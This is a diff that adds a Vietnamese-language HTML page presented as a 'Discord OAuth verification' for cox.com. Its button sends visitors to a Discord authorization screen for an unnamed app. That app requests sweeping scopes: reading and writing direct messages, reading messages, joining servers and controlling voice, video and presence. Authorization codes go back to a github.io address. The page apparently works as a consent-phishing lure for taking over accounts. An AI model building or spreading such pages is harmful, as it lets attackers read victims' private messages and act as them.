@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Xác Minh Discord OAuth</title>
+  <style>
+    /* CSS */
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #36393f;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: #2f3136;
+      padding: 30px;
+      border-radius: 8px;
+      text-align: center;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+    }
+    h1 {
+      margin-bottom: 20px;
+    }
+    .btn {
+      background-color: #7289da;
+      border: none;
+      padding: 12px 25px;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      color: #fff;
+    }
+    .btn:hover {
+      background-color: #677bc4;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Xác Minh Discord OAuth</h1>
+    <p>Nhấn vào nút bên dưới để xác minh Discord OAuth vì <strong>cox.com</strong>.</p>
+    <button class="btn" id="verifyBtn">Xác Minh</button>
+  </div>
+
+  <script>
+    // JavaScript: Xử lý sự kiện click nút và chuyển hướng đến liên kết OAuth
+    document.getElementById('verifyBtn').addEventListener('click', function() {
+      window.location.href = 'https://discord.com/oauth2/authorize?client_id=1318106036913311774&response_type=code&redirect_uri=https%3A%2F%2Ftdaip.github.io%2F18im%2Fvspy%2Fbotrq&scope=identify+guilds.join+guilds.channels.read+dm_channels.read+activities.invites.write+rpc.activities.write+messages.read+applications.commands.permissions.update+dm_channels.messages.write+presences.write+activities.write+rpc.video.write+rpc.voice.write+rpc.notifications.read+dm_channels.messages.read';
+    });
+  </script>
+</body>
+</html>
